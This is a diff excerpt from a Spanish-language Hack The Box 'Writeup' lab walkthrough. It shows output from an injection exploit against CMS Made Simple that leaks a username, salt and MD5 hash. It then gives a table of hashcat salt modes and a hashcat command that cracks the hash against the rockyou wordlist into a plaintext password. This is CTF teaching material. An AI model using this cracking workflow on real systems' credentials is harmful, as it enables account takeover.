@@ -34,4 +34,25 @@ http://writeup.htb/writeup/index.php [200 OK] Apache[2.4.25], CMS-Made-Simple, C
 [+] Salt for password found: 5a599ef579066807
 [+] Username found: jkr
 [+] Email found: jkr@writeup.htb
+[+] Password found: 62def4866937f08cc13bab43bb14e6f7  
+```
+
+| Hashcat mode | Algoritmo         | Fórmula                  |
+| ------------ | ----------------- | ------------------------ |
+| **0**        | MD5               | MD5(password)            |
+| **10**       | md5($salt.$pass)  | MD5(salt + password)     |
+| **20**       | md5($pass.$salt)  | **MD5(password + salt)** |
+
+
+```bash
+Possible Hashs:
+[+] md5($pass.$salt)
+[+] md5($salt.$pass)
+[+] md5($salt.$pass.$salt)
+[+] md5($salt.$pass.$username)
+```
+
+```bash
+sebastianrojas@sebas:~/HTB/writeup$ hashcat -m 20 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show
+62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
 ```
